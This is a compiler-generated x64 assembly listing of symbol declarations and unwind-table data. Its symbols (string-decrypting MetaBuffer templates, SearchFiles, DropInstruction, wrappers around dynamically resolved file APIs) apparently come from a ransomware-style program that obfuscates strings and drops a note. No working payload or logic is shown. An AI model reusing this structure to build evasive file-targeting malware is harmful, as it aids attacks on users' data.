PUBLIC	?decrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$0GN@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<109,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<37,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
PUBLIC	??0?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAA@PEBE@Z ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >
PUBLIC	?decrypt@?$MetaBuffer@$0L@$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@@std@@@@QEAAPEBDXZ ; MetaBuffer<11,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >
PUBLIC	?decrypt@?$MetaBuffer@$0BD@$0HG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ; MetaBuffer<19,118,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
PUBLIC	??0?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<73,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$0CL@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<43,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$0DL@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<59,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<113,70,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$0FD@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<83,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ; MetaBuffer<101,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAA@PEBE@Z ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ ; MetaBuffer<23,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt
PUBLIC	??0?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?decrypt@?$MetaBuffer@$02$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<3,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
PUBLIC	?decrypt@?$MetaBuffer@$0L@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ; MetaBuffer<11,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
PUBLIC	??0?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAAPEBDXZ ; MetaBuffer<61,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >
PUBLIC	?decrypt@?$MetaBuffer@$0BP@$0CD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<31,35,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?decrypt@?$MetaBuffer@$0CL@$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<43,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	??1directory_info_@@QEAA@XZ			; directory_info_::~directory_info_
PUBLIC	??_Gdirectory_info_@@QEAAPEAXI@Z		; directory_info_::`scalar deleting destructor'
PUBLIC	??0directory_info_@@QEAA@XZ			; directory_info_::directory_info_
PUBLIC	?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z ; filesystem::SearchFiles
PUBLIC	?DropInstruction@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; DropInstruction
PUBLIC	?CheckFilename@@YAHPEB_W@Z			; CheckFilename
PUBLIC	?CheckDirectory@@YAHPEB_W@Z			; CheckDirectory
PUBLIC	?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ; MakePath
PUBLIC	?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z ; MakeSearchMask
PUBLIC	?plstrcmpW@@YAHPEB_W0@Z				; plstrcmpW
PUBLIC	?pFindClose@@YAHPEAX@Z				; pFindClose
PUBLIC	?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z ; pFindNextFileW
PUBLIC	?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z ; pFindFirstFileW
PUBLIC	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ	; std::_Fake_proxy_ptr_impl::_Release
PUBLIC	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
PUBLIC	?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD imagerel $LN99
	DD	imagerel $LN99+46
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD imagerel $LN99+46
	DD	imagerel $LN99+440
	DD	imagerel $chain$3$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD imagerel $LN99+440
	DD	imagerel $LN99+446
	DD	imagerel $chain$5$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD imagerel $LN99+446
	DD	imagerel $LN99+452
	DD	imagerel $chain$6$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$7$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD imagerel $LN99+452
	DD	imagerel $LN99+458
	DD	imagerel $chain$7$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z DD imagerel $LN8
	DD	imagerel $LN8+104
	DD	imagerel $unwind$??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN14
	DD	imagerel $LN14+28
	DD	imagerel $unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN14+28
	DD	imagerel $LN14+95
	DD	imagerel $chain$1$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN14+95
	DD	imagerel $LN14+120
	DD	imagerel $chain$2$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z DD imagerel $LN65
	DD	imagerel $LN65+315
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z DD imagerel $LN22
	DD	imagerel $LN22+45
	DD	imagerel $unwind$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z DD imagerel $LN22+45
	DD	imagerel $LN22+116
	DD	imagerel $chain$1$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z DD imagerel $LN22+116
	DD	imagerel $LN22+135
	DD	imagerel $chain$2$?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN61
	DD	imagerel $LN61+264
	DD	imagerel $unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN63
	DD	imagerel $LN63+38
	DD	imagerel $unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN63+38
	DD	imagerel $LN63+95
	DD	imagerel $chain$0$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN63+95
	DD	imagerel $LN63+284
	DD	imagerel $chain$3$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN63+284
